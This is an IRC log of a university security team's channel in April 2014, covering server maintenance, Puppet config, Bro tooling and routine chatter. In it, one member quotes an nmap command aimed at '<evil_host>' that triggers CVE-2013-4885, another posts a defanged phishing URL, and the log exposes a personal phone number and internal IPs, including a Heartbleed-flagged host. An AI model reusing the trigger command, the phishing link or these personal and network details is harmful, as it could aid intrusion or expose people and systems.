2014-04-21 15:27:54	hypnotoad	and do i need to only do it for those files or the ssh_host keys too?
2014-04-21 15:34:47	jazoff	only files in the package...
2014-04-21 15:35:18	hypnotoad	well those files all come when you install the package, hence my confusion
2014-04-21 15:47:11	jazoff	i think the post install script creates them
2014-04-21 15:47:21	jazoff	er, fpm wouldn't have one of those
2014-04-21 15:47:25	hypnotoad	them being the host keys?
2014-04-21 15:47:25	jazoff	init script maybe?
2014-04-21 15:47:28	jazoff	yeah
2014-04-21 15:47:40	hypnotoad	ok so i jsut need to makr the ssh_config and sshd_config as config files?
2014-04-21 15:48:08	jazoff	and maybe /usr/local/nerscmod/etc/moduli  
2014-04-21 15:48:10	jazoff	not sure what that file is
2014-04-21 15:48:32	hypnotoad	ok. what does the --config-files flag really do? in the help it just says that it marks it as a config file
2014-04-21 15:48:54	jazoff	yeah, it marks it as a config file so when you upgrade the package it will not override the config
2014-04-21 15:49:18	hypnotoad	ahh the second half there is what i was confused about. thanks. time to rebuild then.
2014-04-21 15:50:00	hypnotoad	oh actually. do you kinow if i can pass multiple files to --config-files? i would presume so but just space separated?
2014-04-21 15:53:14	jazoff	'If you have multiple files to mark as configuration files, specify this flag multiple times.
2014-04-21 15:53:17	jazoff	says the docs
2014-04-21 15:53:34	jazoff	makes sense, otherwise it would not know when the config files stop
2014-04-21 15:53:37	hypnotoad	now i feel really stupid. didnt realize the help on the wiki right scrolled
2014-04-21 15:53:55	 *	hypnotoad living up to today's monday billing
2014-04-21 19:27:53	wardog	keist: http://lifehacker.com/why-i-killed-my-standing-desk-and-what-i-do-instead-1565554537
2014-04-22 09:51:10	hypnotoad	wardog: i saw that standing desk article too and thought of keist as well
2014-04-22 10:15:14	keist	putting my feet up sounds good :)
2014-04-22 10:22:48	hypnotoad	Ya I was thinking office purchased ottomans sound like a requirement now.
2014-04-22 10:58:40	wardog	Anyone else having problems accessing google docs right now?
2014-04-22 10:58:59	wardog	Every document I open is sluggish and I get a 'Reconnecting' dialog every time
2014-04-22 10:59:41	hypnotoad	dunno. dont use google docs
2014-04-22 11:37:00	hypnotoad	Just a heads up. I'll be off Friday.
2014-04-22 12:24:58	wardog	Your head will be off friday?
2014-04-22 12:37:47	keist	is anyone opposed to me setting up a smokeping server (http://oss.oetiker.ch/smokeping/) to do latency measurements among the security servers. I think it would be a nice addition to the current monitoring since nagios doesn't do graphing well. It's from the guy who wrote RRDTool and MRTG, anyways, graphs look nice.
2014-04-22 13:14:56	eyrich	are we concerend about latency?
2014-04-22 13:15:57	eyrich	i have used smokeping to troubleshoot issues with WAN connected services, but all out suff exist in the same rack and are all ethernet connected
2014-04-22 13:18:09	eyrich	i also have concerns about how it behaves on a VM system - as the clock on a VM is not accurate
2014-04-22 13:18:22	eyrich	so might be ok to run from one of the HW servers
2014-04-22 14:06:36	hypnotoad	jazoff: are the scripts that generate nfsen alerts in puppet?
2014-04-22 14:16:28	hypnotoad	eyrich: what was the ca net cidr?
2014-04-22 14:24:54	wardog	Is there a floor plan for NCSA somewhere?
2014-04-22 14:37:15	eyrich	http://www.fs.illinois.edu/docs/default-source/FIR/564----ncsa.pdf?sfvrsn=0
2014-04-22 14:43:30	wardog	huh. I thought these were not accessible online.
2014-04-22 14:43:41	eyrich	ya well there you go
2014-04-22 16:29:49	hypnotoad	jazoff: woo transferred my whitelist script to use argparse instead of optparse. so now i can look into adding remove/list functionality too
2014-04-23 08:46:22	eyrich	jazoff: Arista/Bro integration - do you have something public I can point Arista to?
2014-04-23 09:26:24	wardog	KEISTER: TEDRA DROPPED OFF YOUR ANTI-FATIGUE MAT SO YOU CAN PLACE IT WHERE YOU WANT. OLD MAN.
2014-04-23 09:39:09	wardog	This is new: kinit: KDC has no support for encryption type while getting initial credentials
2014-04-23 09:51:42	wardog	keister. The weeks between finals and summer II are usually the quietest on campus and likely the best time to hit the sand volleyball courts.
2014-04-23 09:54:50	hypnotoad	does kerberos use openssl? i wonder if an update there is to blame..
2014-04-23 09:55:46	wardog	You getting the same error?
2014-04-23 09:55:58	hypnotoad	no just postulating based on your error
2014-04-23 09:56:45	wardog	kinit on fog work for you?
2014-04-23 09:58:40	hypnotoad	ya
2014-04-23 09:58:47	hypnotoad	after failing to type correctly 4 times..
2014-04-23 10:01:24	wardog	weird.
2014-04-23 10:01:36	hypnotoad	maybe it was a weird network glitch? you try again?
2014-04-23 10:01:56	wardog	Nope.
2014-04-23 10:01:57	wardog	It hates me
2014-04-23 10:02:04	wardog	kinit: KDC has no support for encryption type while getting initial credentials
2014-04-23 10:26:50	wardog	I mean, yep, tried again. Nope=doesn't work.
2014-04-23 10:27:00	wardog	jazoff: ?
2014-04-23 10:27:08	wardog	you around today?
2014-04-23 10:38:20	wardog	well, figured it out. 
2014-04-23 10:38:25	wardog	My kerberos password expired.
2014-04-23 10:42:06	wardog	and fixed.
2014-04-23 11:35:11	wardog	wheres jazoff today?
2014-04-23 11:35:28	hypnotoad	dunno i know he was off yesterday
2014-04-23 11:35:46	wardog	Oh right. I think he's at Nike
2014-04-23 12:23:03	jazoff	yes, nike
2014-04-23 12:23:38	jazoff	eyrich: I have a local git repo, I can push it to github if that is desired
2014-04-23 12:30:14	wardog	I think the temp is dropping about 3 degrees an hour around here. Seemed fine this morning.
2014-04-23 12:30:36	wardog	Meaning, in the building. Not outside.
2014-04-23 12:59:23	wardog	so quiet today
2014-04-23 13:11:07	wardog	hypnotoad: found a drive
2014-04-23 13:11:28	hypnotoad	cool
2014-04-23 13:12:50	wardog	DO you have any SATA drives in there. pref 250G or larger?
2014-04-23 13:13:34	wardog	If not I have a few at home
2014-04-23 13:14:27	hypnotoad	you got a screw driver on you?
2014-04-23 13:14:48	wardog	No, but I think I know where to borrow one.
2014-04-23 13:14:55	hypnotoad	icepicks not in right now
2014-04-23 13:17:07	eyrich	hypnotoad: here
2014-04-23 13:17:27	wardog	Your office door is shut
2014-04-23 13:17:47	eyrich	nopr
2014-04-23 13:17:49	eyrich	nope
2014-04-23 13:17:55	wardog	ah
2014-04-23 13:18:00	wardog	sneak in eh....
2014-04-23 13:43:41	eyrich	jazoff: yes please do
2014-04-23 13:44:00	eyrich	you should put in the UofI lic 
2014-04-23 13:44:16	eyrich	http://opensource.org/licenses/NCSA
2014-04-23 13:46:48	jazoff	ah
2014-04-23 13:47:02	jazoff	just realized the repo is on my macbook which is at home sleeping
2014-04-23 13:47:18	jazoff	I can push it somewhere first thing next week
2014-04-23 14:17:24	eyrich	ok
2014-04-23 14:43:55	wardog	Who are the VM managers for ITS again? Glick and who else?
2014-04-23 14:50:53	wardog	eyrich: you see that discussion on RI-OPS about checking synologies for bitcoin miners.
2014-04-23 15:14:30	hypnotoad	wardog: bill glick is the main, though melliot would be the backup
2014-04-23 15:19:00	eyrich	I had heard about that - lesson to be learned - put SANs on non routed SAN nets
2014-04-23 15:21:03	hypnotoad	you mean not open to the world!?
2014-04-23 15:22:32	eyrich	at home yes, in an enterprise a SAN net
2014-04-23 15:22:41	hypnotoad	sorry sarcasm was missed
2014-04-23 15:22:46	eyrich	ah - yes ok
2014-04-23 17:22:13	wardog	keist: fyi, in case you're still around, Wayland was out sick today. Doesn't know what that means for your LUG tonight
2014-04-24 10:41:45	hypnotoad	ughhhh spent the morning trying to figure out the moinmoin stuff, only to realize i cant download the source because the website is down..
2014-04-24 10:43:37	wardog	no mirrors?
2014-04-24 10:44:01	hypnotoad	some ones that might work, but i wanna be sure im using the official and latest build
2014-04-24 10:47:11	wardog	hypnotoad: when you have a chance, can you re-vet the robin hood server. I let that sit too long.
2014-04-24 10:56:03	wardog	fixed the phalanx stuff for qualys scans.
2014-04-24 10:56:16	wardog	Not sure if we need it anymore. I think this an old vulnerability that isn't even around anymore.
2014-04-24 10:56:36	wardog	If anything, we need to be a little more proactive of ssh key management.
2014-04-24 11:14:18	jazoff	did someone try calling me?
2014-04-24 11:15:15	jazoff	missed a call from 217-390-3837
2014-04-24 11:15:57	jazoff	have to run.. if the answer was yes, txt will work better, loud here.
2014-04-24 11:16:26	wardog	Yes.Bro meeting.
2014-04-25 10:03:09	hypnotoad	wardog: can you send me an email or open a ticket for the vetting?
2014-04-25 15:20:19	wardog	hypnotoad: yep
2014-04-25 15:23:35	wardog	Just when I thought all the hosts were done sending to thunder.... dns1 and ncsa-07-probe-eth0.ncsa.uiuc.edu pop up.
2014-04-28 07:12:33	<--	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has quit (Connection reset by peer)
2014-04-28 07:25:01	-->	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has joined #security
2014-04-28 08:14:34	wardog	jazoff: don't forget arista code
2014-04-28 08:14:39	wardog	http://opensource.org/licenses/NCSA
2014-04-28 09:43:29	jazoff	yawn
2014-04-28 09:43:41	jazoff	i'm on it
2014-04-28 09:45:12	jazoff	looks like it styaed running the entire time I was away
2014-04-28 09:45:21	jazoff	not sure what was up with the previous SSL lockups
2014-04-28 09:51:11	jazoff	so much email
2014-04-28 09:52:37	jazoff	much nagios. such FP. wow.
2014-04-28 09:57:55	jazoff	eyrich: https://github.com/JustinAzoff/dumbno
2014-04-28 10:01:13	jazoff	eyrich: so that repo is there.. it doesn't include the bro specific components though
2014-04-28 10:01:56	eyrich	can do you a short write up that some one can follow to make it run
2014-04-28 10:07:44	jazoff	sure
2014-04-28 10:08:20	jazoff	main thing I need to fix first is un-hard code the settings
2014-04-28 10:08:30	jazoff	just need to add cfg file support and then it should be very easy to get running
2014-04-28 10:27:16	eyrich	qualys found this on isce
2014-04-28 10:27:18	eyrich	http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-4885
2014-04-28 10:27:36	eyrich	Is there a valid reason for isce to have nmap?
2014-04-28 10:27:57	eyrich	hypnotoad: what would you do if you found when vetting?
2014-04-28 10:29:32	jazoff	that seems like the most obscure vulnerability ever
2014-04-28 10:29:57	jazoff	you have to run nmap like
2014-04-28 10:29:58	jazoff	nmap --script domino-enum-passwords -p 80 <evil_host> --script-args domino-enum-passwords.username='patrik karlsson',domino-enum-passwords.password=secret,domino-enum-passwords.idpath='/tmp
2014-04-28 11:00:43	jazoff	config file support added
2014-04-28 11:37:13	jazoff	eyrich: https://github.com/JustinAzoff/dumbno
2014-04-28 11:37:37	jazoff	more packaging and docs work to do, but someone should be able to get the arista parts running
2014-04-28 11:37:47	jazoff	need to extract the bro specific stuff into a repository
2014-04-28 11:42:14	wardog	dumbno?
2014-04-28 11:42:26	jazoff	wardog: no elephant flows
2014-04-28 11:42:39	wardog	AHHH
2014-04-28 11:58:48	hypnotoad	eyrich: i wouldnt have found that while vetting as jazoff pointed out, but i would likely go talk to him and see if we couldnt get it taken care of asap. 
2014-04-28 11:59:46	jazoff	well, I mean that is pretty much a non-issue
2014-04-28 12:00:03	jazoff	someone literally has to run that exact command for there to be a vulnerability
2014-04-28 12:00:32	hypnotoad	right, but the general rule for my vetting is if i find an actual exploitable hole, i deal with it right away
2014-04-28 12:00:46	hypnotoad	so even though its probably the least likely hole to be exploited, thats the process
2014-04-28 12:01:07	jazoff	well, it's an exploitable hole if someone starts nmap in an obsure way to scan for a particular service on an obscure platform that I don't think anyone around here uses
2014-04-28 12:01:26	hypnotoad	agreed, but my rule of thumb is if it has a cve, it gets addressed
2014-04-28 12:01:32	jazoff	though... if their nmap package is out of date, other stuff might be too
2014-04-28 12:01:46	hypnotoad	not like its hard to send a quick message saying this needs your attention
2014-04-28 12:24:12	jazoff	eyrich: newer EOS should have API support for listing ACLS, so I can remove a bunch of code if we upgrade
2014-04-28 13:06:50	eyrich	hypnotoad: so you dont care if people have nmap installed?
2014-04-28 13:07:59	hypnotoad	just having it installed? no. its a perfectly legitimate tool. if we find them using it in an untoward manner, then we would have a talk with them.
2014-04-28 13:07:59	hypnotoad	granted this is strictly my policy and it's never come up before so im open to discussion
2014-04-28 15:18:10	hypnotoad	so pduda had a MHR hit on friday but it looked pretty innocuous so i told him to do an av scan...just realized he donwloaded some av software that was a trojan..
2014-04-28 15:26:27	wardog	I saw some host download a bunch of malware on Friday.
2014-04-28 15:26:38	wardog	Can't remember if I cc'ed security@
2014-04-28 15:26:46	hypnotoad	you didnt
2014-04-28 15:26:46	hypnotoad	that was a usernet one
2014-04-28 15:27:52	wardog	yeah. Fresh ssystem. didn't see much history on it.
2014-04-28 15:28:10	hypnotoad	well thats part of the problem with usernet. you dont know it was a fresh system
2014-04-28 15:28:27	wardog	I mean, the mac hadn't been seen on the network before.
2014-04-28 15:28:31	hypnotoad	ah
2014-04-28 15:48:45	hypnotoad	wardog: i just now see your email about that host...and its dated tht e25th..
2014-04-28 16:10:20	wardog	magic
2014-04-28 16:40:25	wardog	soo..... thoughts on using CentOS instead of RHEL?
2014-04-28 16:40:39	hypnotoad	porque?
2014-04-28 16:41:00	wardog	License costs are quadrupling and CITES is potentially dropping theirs.
2014-04-28 16:41:28	hypnotoad	ah. well i guess i dont really care long term, but id be more open to the change when we had everything puppetized
2014-04-28 16:41:38	hypnotoad	so we could get up to speed really easily
2014-04-28 16:51:45	wardog	Actually, if CITES drops it, NCSA is likely not going to attempt to try to get back a site license.
2014-04-28 16:53:07	wardog	We'll be forced to choose a different distro
2014-04-28 16:53:37	wardog	So, if CentOS, the questions is, would we want to spin up Spacewalk?
2014-04-28 16:54:19	hypnotoad	i would definitely prefer centos then due to 1) most of our work would port no question. 2) ive always preferred using centos
2014-04-28 18:10:22	keist	I'm fine with CentOS
2014-04-28 18:10:55	keist	registration was always a PITA for one off boxes
2014-04-29 07:40:20	jazoff	hmm, something is up with munin-sec
2014-04-29 07:40:30	jazoff	looks like the fcgi-graph process died and i can't login via kerberos
2014-04-29 08:09:40	eyrich	email attachments with this link in them getting sent out wit compromised google accounts
2014-04-29 08:09:42	eyrich	hxxp://googlefiledocs.bugs3.com/GoogleDO.php
2014-04-29 08:09:58	eyrich	i have blocked the IP it currentley resolves to in the BHR
2014-04-29 08:10:59	jazoff	according to the passive dns stuff it's only ever been that IP and nothing else resolves to that IP
2014-04-29 08:12:44	jazoff	ut oh....
2014-04-29 08:12:50	jazoff	got into munin sec using secops...
2014-04-29 08:13:17	jazoff	sd 2:0:0:0: [sda] Unhandled error code
2014-04-29 08:13:18	jazoff	sd 2:0:0:0: [sda] Result: hostbyte=DID_OK driverbyte=DRIVER_OK
2014-04-29 08:13:18	jazoff	sd 2:0:0:0: [sda] CDB: Write(10): 2a 00 04 4d bf 80 00 00 08 00
2014-04-29 08:13:18	jazoff	Buffer I/O error on device dm-6, logical block 269808
2014-04-29 08:13:18	jazoff	lost page write due to I/O error on dm-6
2014-04-29 08:14:04	jazoff	though those are helpfuly not timestamped
2014-04-29 08:21:23	jazoff	ah. they might not be recent at all
2014-04-29 08:22:02	jazoff	oh, maybe not
2014-04-29 08:22:10	jazoff	^C[secops@munin-sec munin]$ sudo /etc/init.d/munin-fcgi-graph restart
2014-04-29 08:22:10	jazoff	chown: changing ownership of `/var/run/munin': Read-only file system
2014-04-29 08:22:10	jazoff	chown: changing ownership of `/var/run/munin': Read-only file system
2014-04-29 08:27:06	jazoff	eyrich: vmware problem?
2014-04-29 08:29:42	eyrich	not that I see
2014-04-29 08:30:05	eyrich	vmware tools is either not installed or not running
2014-04-29 08:31:07	jazoff	can try rebooting it I guess
2014-04-29 08:31:23	eyrich	that looks to be true on a bunch of machines - that needs to be fixed
2014-04-29 08:32:14	jazoff	reboot worked
2014-04-29 09:00:33	hypnotoad	today is reboot day. anyone got a mchine they want me to hold off on til later today?
2014-04-29 10:21:46	jazoff	i need a reboot
2014-04-29 10:24:17	 *	hypnotoad hears that
2014-04-29 10:32:23	wardog	CITES is going to be forcing password changes in the next few weeks. It'll be staggered in groups of X so as not to overwhelm the campus password change site. https://passwords.cites.illinois.edu/ They're starting first round tomorrow but if you change your password today or after they should skip you.
2014-04-29 10:34:13	jazoff	fun
2014-04-29 10:34:40	jazoff	just when I finally got used to it
2014-04-29 10:57:35	hypnotoad	is hurricane still needed on?
2014-04-29 10:58:20	jazoff	probably not
2014-04-29 10:59:10	hypnotoad	can i get a more definitive answer? i'll turn it off today if i can
2014-04-29 11:00:13	jazoff	flows-sec is working well..
2014-04-29 11:00:24	hypnotoad	so we just waiting on wardog's word then?
2014-04-29 11:00:38	jazoff	some of the tools that were running on hurricane still need to be updated, but as far as I can tell they don't actually work on hurricane anyway
2014-04-29 11:01:26	hypnotoad	tools?
2014-04-29 11:01:34	jazoff	er... nfsen plugins
2014-04-29 11:02:04	hypnotoad	ahh
2014-04-29 11:02:18	hypnotoad	ok i guess i wont turn it off yet then
2014-04-29 11:03:21	jazoff	well like I said.. I don't think they work anyway
2014-04-29 11:03:43	hypnotoad	right, but i presume you want to know what they are so you can fix them?
2014-04-29 11:03:43	hypnotoad	or do we not care about them?
2014-04-29 11:03:47	jazoff	my plan is to replace them all with one plugin that uses our cif server
2014-04-29 11:03:58	jazoff	oh, I have them in the git repo
2014-04-29 11:04:11	hypnotoad	oh ok then. i'll kill it if wardog okays it
2014-04-29 11:04:17	jazoff	puppet/modules/nfsen/files/plugins/
2014-04-29 11:07:41	hypnotoad	ncsabot not showing my last git push.
2014-04-29 11:15:07	ncsabot	test
2014-04-29 11:15:24	jazoff	bot seems ok
2014-04-29 11:15:29	hypnotoad	weird
2014-04-29 11:15:47	jazoff	did your push.. push?
2014-04-29 11:16:11	hypnotoad	ya
2014-04-29 11:16:11	hypnotoad	if i do a push it says everything up to date
2014-04-29 11:16:16	hypnotoad	git status agrees
2014-04-29 11:16:39	jazoff	weird
2014-04-29 11:16:49	jazoff	which repo was it to?
2014-04-29 11:17:03	hypnotoad	puppet dev
2014-04-29 11:17:40	jazoff	i don't see anything from you recenty
2014-04-29 11:19:58	jazoff	oh, there it is
2014-04-29 11:19:58	jazoff	* | cc7c7b6 - remove samba stuff (12 minutes ago) <Sam Oehlert>
2014-04-29 11:20:38	jazoff	i think it might not have shown it because it was a merge or something like that
2014-04-29 11:21:22	jazoff	hmm, no, wouldnt be that
2014-04-29 11:21:27	hypnotoad	ahhh ok
2014-04-29 11:22:01	jazoff	it's weird that I don't see it from git log
2014-04-29 11:22:09	jazoff	but I do from git log --all
2014-04-29 11:22:56	jazoff	ooh, it's in the puppet configs repo
2014-04-29 11:23:07	hypnotoad	that seems odd as well
2014-04-29 11:23:07	hypnotoad	it picked up my push this time
2014-04-29 11:23:07	hypnotoad	ooooo right whoops
2014-04-29 11:23:10	jazoff	erll, branch
2014-04-29 11:23:21	jazoff	that shouldn't matter though
2014-04-29 11:23:23	hypnotoad	i did it in the dev common file for configs so i got confused w
2014-04-29 11:23:52	jazoff	ah, now it showed up
2014-04-29 11:26:25	hypnotoad	ahh hell removing samba stuff fails on deps..
2014-04-29 11:30:58	jazoff	oh? does something depend on the libs?
2014-04-29 11:31:25	hypnotoad	no its all samba stuff. i figured it might do them out of order but still at least get one package every run
2014-04-29 11:31:58	hypnotoad	oh well ill deal with it later
2014-04-29 11:48:19	wardog	hmmm. hurricane? Do we have a copy of the old nfsen scripts?
2014-04-29 11:48:33	hypnotoad	ya jazoff has them in git
2014-04-29 11:49:15	wardog	k. Just get rid of the redirect from flows-sec and then make sure nothing else is coming into hurricane and it can go away.
2014-04-29 11:49:29	wardog	Looks like Thunder can go too
2014-04-29 11:49:39	wardog	cnames and all.
2014-04-29 11:49:51	hypnotoad	jazoff: can you take a peak at that? 
2014-04-29 11:49:51	hypnotoad	also, i'd like to rebuild supercell at some point. it was installed with so many packages...
2014-04-29 11:50:27	wardog	looks like thunder is already down. :)
2014-04-29 11:50:30	jazoff	yeah.. I have almost everything automated for bro-dev
2014-04-29 11:50:37	jazoff	except the myricom driver installation
2014-04-29 11:50:47	jazoff	otherwise we would already be good to go
2014-04-29 11:51:00	hypnotoad	thunder was killed
2014-04-29 11:51:00	hypnotoad	and cool...it has 338 pacakges it wants to update..many of which are x11 stuff
2014-04-29 11:51:04	wardog	I'm getting access denied on flows-sec
2014-04-29 11:51:05	jazoff	I ran this on hurricane an hour ago: [jazoff@hurricane ~]$ sudo tcpdump -nn -i eth0 port 8888
2014-04-29 11:51:09	jazoff	no packets
2014-04-29 11:51:42	hypnotoad	wardog: as in you cant login?
2014-04-29 11:51:43	jazoff	hypnotoad: I can take a look and remove anything we don't need
2014-04-29 11:51:53	hypnotoad	if you wanna go that way you're more than welcome to as well
2014-04-29 11:52:00	jazoff	[jazoff@supercell ~]$ rpm -qa|grep -i gnome -c
2014-04-29 11:52:01	jazoff	54
2014-04-29 11:52:08	wardog	bah, nevermind.... wrong pw for kinit
2014-04-29 11:52:11	hypnotoad	i guess soon its going to be blown away to be turned into centos anyways
2014-04-29 11:53:10	wardog	just need to get rid of hurricane from the samplicate config and restart samplicate.
2014-04-29 11:53:18	jazoff	yeah
2014-04-29 11:53:50	jazoff	that is here:
2014-04-29 11:53:50	jazoff	hieradata/hosts/flows-sec.yaml:samplicate::destinations: '141.142.148.21/9999'
2014-04-29 11:53:59	jazoff	(127.0.0.1/9999 is hardcoded)
2014-04-29 11:54:12	jazoff	just need to set it to ''
2014-04-29 11:54:44	jazoff	done
2014-04-29 11:54:58	jazoff	not sure if it will restart on its own though
2014-04-29 11:56:18	jazoff	ah, looked at the heartbleed dashboard
2014-04-29 11:56:21	jazoff	https://141.142.227.213/ showed up
2014-04-29 11:56:33	jazoff	another ESXi host
2014-04-29 12:02:51	jazoff	walk time :)
2014-04-29 12:39:08	hypnotoad	jazoff: bro cluster has been rebooted. cursory glance looked like its back ok if you notice anything lemme know
2014-04-29 12:39:58	jazoff	supercell you mean?
2014-04-29 12:40:05	hypnotoad	ya production cluster
2014-04-29 12:40:10	jazoff	ok
2014-04-29 12:40:20	jazoff	yeah, that shoudl be fine
2014-04-29 12:40:35	jazoff	bro-dev has some test stuff that won't autostart, but supercell should have come up fine
2014-04-29 12:42:23	hypnotoad	ok well bro-dev is on the todo list so ill let you know when i get thre
2014-04-29 12:42:35	jazoff	ok
2014-04-29 12:58:15	hypnotoad	drought going down for reboot
2014-04-29 13:04:45	hypnotoad	seems ok
2014-04-29 13:05:24	hypnotoad	jazoff: whats the head node name for brodev?
2014-04-29 13:05:30	jazoff	bro-dev
2014-04-29 13:05:32	jazoff	:)
2014-04-29 13:05:41	hypnotoad	ahh forgot the hypehn
2014-04-29 13:06:06	hypnotoad	supercell: 388 packages updated. bro-dev 39
2014-04-29 13:08:24	jazoff	:)
2014-04-29 13:08:33	jazoff	http://www.vagrantup.com/blog/feature-preview-vagrant-1-6-docker-dev-environments.html
2014-04-29 13:16:46	wardog	it's like someone kicked supercell in the kidneys.
2014-04-29 13:16:50	wardog	And it's spilling out emails.
2014-04-29 13:17:23	jazoff	hmm
2014-04-29 13:17:32	hypnotoad	well 80 processes each saying they crashed is expected...seems to have crashed again?
2014-04-29 13:17:59	jazoff	lemme see
2014-04-29 13:23:47	hypnotoad	jazoff: bro-dev cluster is rebooting
2014-04-29 13:29:34	hypnotoad	seriously? our rsa update process requires typing in a ~50 character URL on our phone?
2014-04-29 13:30:27	eyrich	no - use copy and paste!
2014-04-29 13:30:35	hypnotoad	from where exactly
2014-04-29 13:30:43	eyrich	copy it from the email
2014-04-29 13:30:50	hypnotoad	i dont do work email on my phone
2014-04-29 13:30:51	eyrich	and then go into the RSA app and paste it
2014-04-29 13:30:53	eyrich	i just did it last week
2014-04-29 13:31:00	eyrich	then forward from work email to your personal
2014-04-29 13:38:59	jazoff	bro should be better now
2014-04-29 13:39:05	jazoff	did a full stop + clean + start
2014-04-29 13:39:06	hypnotoad	thanks
2014-04-29 13:39:28	jazoff	next time we need to reboot do a broctl stop first
2014-04-29 13:39:35	jazoff	that should hopefully behave nicer
2014-04-29 13:39:40	hypnotoad	ahhh ok
2014-04-29 13:39:50	jazoff	posibly can add that to init somewhere so it does it automatically
2014-04-29 13:43:36	jazoff	crap, i forgot to eat lunch
2014-04-29 13:52:56	<--	wardog (wraquel@hidden-EA35C84E.ncsa.illinois.edu) has quit (Quit: leaving)
2014-04-29 14:05:39	hypnotoad	jazoff: too bad you didnt update before you rebooted munin-sec
2014-04-29 14:07:30	jazoff	hypnotoad: the filesystems were read only
2014-04-29 14:07:58	hypnotoad	oh right that was the issue.
2014-04-29 14:15:10	hypnotoad	jazoff: how do i start nfsen? doesn't look like it came up automatically
2014-04-29 14:15:28	jazoff	shoudl be in /etc/init.d
2014-04-29 14:15:38	hypnotoad	ok didnt know if it needed anything but that
2014-04-29 14:15:58	jazoff	what runlevel is that box?
2014-04-29 14:16:08	jazoff	hmm, it is 3...
2014-04-29 14:16:17	jazoff	cause I did
2014-04-29 14:16:18	jazoff	lrwxrwxrwx 1 root root 26 Mar 18 12:00 /etc/rc.d/rc3.d/S99nfsen -> /usr/local/nfsen/bin/nfsen
2014-04-29 14:16:22	jazoff	so it should have started...
2014-04-29 14:17:57	hypnotoad	grr nfsen doesn't support chkconfig
2014-04-29 14:21:46	jazoff	yeah, it;s not a real init script
2014-04-29 14:21:56	jazoff	it's the perl program itself that supports start/stop
2014-04-29 14:21:56	hypnotoad	i see
2014-04-29 14:22:05	jazoff	repeat after me.. fucking sysvinit
2014-04-29 14:30:19	-->	wraquel (wraquel@hidden-EA35C84E.ncsa.illinois.edu) has joined #security
2014-04-29 14:42:54	hypnotoad	updating & rebooting puppet master unless someone needs it at the moment
2014-04-29 15:02:34	hypnotoad	puppets up and running again
2014-04-29 15:11:34	wraquel	"I'm a real boy!" -Pinocchio
2014-04-29 15:22:10	hypnotoad	jazoff: is there a reason were using hieradata/hosts/flows-sec instead of wrapping that into the netflow.yaml?
2014-04-29 15:26:36	jazoff	ummm
2014-04-29 15:26:47	jazoff	oh, because of hurricane
2014-04-29 15:27:00	jazoff	hieradata/hosts/hurricane.yaml:samplicate::destinations: '141.142.148.20/9999'
2014-04-29 15:27:00	jazoff	hieradata/hosts/flows-sec.yaml:samplicate::destinations: ''
2014-04-29 15:27:11	jazoff	it needed to be different on a per host basis
2014-04-29 15:28:03	hypnotoad	ahh i see. well that's not an issue anymore right?
2014-04-29 15:28:32	jazoff	I supppppose not
2014-04-29 15:28:49	hypnotoad	ok cool. i'd really prefer to avoid using host specific stuff unless we have to
2014-04-29 15:28:57	jazoff	well we don't anymore
2014-04-29 15:29:08	hypnotoad	yup i know. just trying to clean up where we can
2014-04-29 15:29:29	jazoff	yep, that was definitely a 'we had to' thing
2014-04-29 15:29:39	hypnotoad	right
2014-04-29 15:29:56	jazoff	though with hurriacane going away and flows-sec using the default if no secondary destinations, both of those files can be removed
2014-04-29 15:30:10	hypnotoad	thats what i was hoping
2014-04-29 16:01:18	wraquel	NBA threw down the ban hammer on Sterling today.
2014-04-29 16:01:53	hypnotoad	saw that. he gone
2014-04-30 07:55:30	<--	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has quit (Connection reset by peer)
2014-04-30 09:11:15	-->	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has joined #security
2014-04-30 09:50:13	wraquel	hypnotoad: I'm stupid. There wasn't anything in that folder so it didn't add it.
2014-04-30 09:51:19	hypnotoad	ahh that makes some sense then
2014-04-30 10:53:00	wraquel	Virtual Datacenter - $2k per 2socket licensed ESX box. Individual server with full support - $770per , Individual Server with self-support, $80 per.
2014-04-30 10:53:27	wraquel	Currently we 'pay' $1,200 for our existing licenses.
2014-04-30 10:53:37	wraquel	I think ISF just picks up the tab.
2014-04-30 10:53:38	wraquel	for now
2014-04-30 10:53:47	hypnotoad	and we'd be looking at about 4500
2014-04-30 10:57:11	wraquel	We wouldn't need any more than self-support right? https://access.redhat.com/site/support/offerings/production/sla
2014-04-30 10:57:48	hypnotoad	right thats what i was basing it on. 4k on vms and i guess itd be more like 240 for self supported hardware
2014-04-30 10:58:14	wraquel	We could put any non public IP host as CentOS. Anything public facing RHEL.
2014-04-30 10:58:23	wraquel	Unless that's too much work.
2014-04-30 10:58:32	hypnotoad	no no i dont wanna mix and match
2014-04-30 10:58:52	wraquel	fair nuff
2014-04-30 10:59:07	hypnotoad	to be honest, switching to centos will be fairly easy except on terry's stuff
2014-04-30 11:32:35	wraquel	Still getting details, but we could be losing the campus splunk license in the near future.
2014-04-30 11:32:50	wraquel	If we have to revert to our 10G license we'll have to scale back what we push into splunk.
2014-04-30 11:40:56	wraquel	Getting some lag over ssh connections to VMs. My connection to my home system seems unaffected.
2014-04-30 11:41:33	wraquel	And just lost connection to fog
2014-04-30 11:41:37	hypnotoad	just you..
2014-04-30 11:58:02	hypnotoad	not just you..
2014-04-30 12:01:30	--	irc: disconnected from server
2014-04-30 12:01:42	-->	hypnotoad (soehlert@hidden-EF13FB3B.hsd1.il.comcast.net) has joined #security
2014-04-30 12:01:42	--	Nicks #security: [eyrich hypnotoad jazoff keist wraquel]
2014-04-30 12:01:42	--	Channel #security: 5 nicks (0 ops, 0 halfops, 0 voices, 5 normals)
2014-04-30 12:01:44	jazoff	kibana
2014-04-30 12:01:46	wraquel	Had fancy graphical dashboards...
2014-04-30 12:01:47	wraquel	yeah.
2014-04-30 12:01:53	--	Mode #security [+]
2014-04-30 12:01:53	--	Channel created on Tue, 04 Feb 2014 20:39:53
2014-04-30 12:01:54	jazoff	but splunk is not just search.. so when I do something like
2014-04-30 12:01:54	jazoff	host=tornado HEARTBLEED addr=* (VULN OR FIXED) | reverse | dedup addr port type | reverse
2014-04-30 12:01:56	wraquel	Kibana. Sounds like a crowdfunding project...
2014-04-30 12:02:07	wraquel	new ones?
2014-04-30 12:19:06	--	irc: disconnected from server
2014-04-30 12:19:18	-->	hypnotoad (soehlert@hidden-EF13FB3B.hsd1.il.comcast.net) has joined #security
2014-04-30 12:19:18	--	Nicks #security: [eyrich hypnotoad jazoff keist wraquel]
